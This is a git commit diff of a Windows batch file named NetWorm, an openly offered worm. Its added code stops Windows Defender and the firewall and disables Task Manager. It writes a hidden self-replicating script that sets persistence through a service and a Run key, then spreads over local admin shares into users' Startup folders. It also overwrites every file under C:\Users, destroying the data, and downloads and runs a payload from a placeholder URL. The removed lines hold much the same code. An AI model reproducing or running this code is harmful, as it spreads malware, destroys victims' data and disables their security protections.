4acaa32c769e2558fd206e38beeebc9b7d52d289
TheG0df2ther <63458929+TheG0df2ther@users.noreply.github.com>
2020-05-26 14:24:28 +0200

    NetWorm

--- NetWorm.bat
+++ NetWorm.bat
@@ -1,25 +1,38 @@
 @echo off
-set gg=0
-set servicename=DE
-echo sc create %servicename% binpath=%0 >> service.bat
-echo sc start %servicename% >> service.bat
-attrib +h +r +s service.bat
-start service.bat
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
-attrib +h +r +s %0
 
-:abdhd
-net use Z: \\192.168.1.%gg%\C$
-if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.bat"
-mountvol Z: /d)
-if %i% == 256 (goto infect) else (set /a i=i+1)
-goto abdhd
+net stop "Windows Defender Service"
+net stop "Windows Firewall"
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 
-:infect
-for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)
-for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)
+echo CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False >> invisible.vbs
 
-:payload
-powershell -Command "(New-Object Net.WebClient).DownloadFile('URL HERE', 'Download_Execute.exe')"
-powershell -Command "Invoke-WebRequest <URL HERE> -OutFile Downoad_Execute.exe"
-start %USERPROFILE%\Downloads\Download_Execute.exe
+echo @echo off > Worm.bat
+echo SET i=0 >> Worm.bat
+echo SET "service=NetWorm.bat" >> Worm.bat
+echo SET "service=NetWorm" >> Worm.bat
+
+echo echo sc create %service% binpath=%0 > service.bat >> Worm.bat
+echo echo sc start %service% >> service.bat >> Worm.bat
+echo attrib +h +r +s service.bat >> Worm.bat
+echo start service.bat >> Worm.bat
+
+echo reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0 >> Worm.bat
+echo attrib +h +r +s %0 >> Worm.bat
+
+echo :Worm >> Worm.bat
+echo net use Z: \\192.168.1.%i%\C$ >> Worm.bat
+echo if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe" >> Worm.bat
+echo mountvol Z: /d) >> Worm.bat
+echo if %i% == 256 (goto Infect) else (set /a i=i+1) >> Worm.bat
+echo goto Worm >> Worm.bat
+
+echo :Infect >> Worm.bat
+echo for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat) >> Worm.bat
+echo for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f) >> Worm.bat
+
+echo :payload >> Worm.bat
+echo powershell -Command "(New-Object Net.WebClient).DownloadFile('URL HERE', 'Payload.exe')" >> Worm.bat
+echo powershell -Command "Invoke-WebRequest <URL HERE> -OutFile Payload.exe" >> Worm.bat
+echo start %USERPROFILE%\Downloads\Payload.exe >> Worm.bat
+
+wscript.exe "invisible.vbs" "Worm.bat"
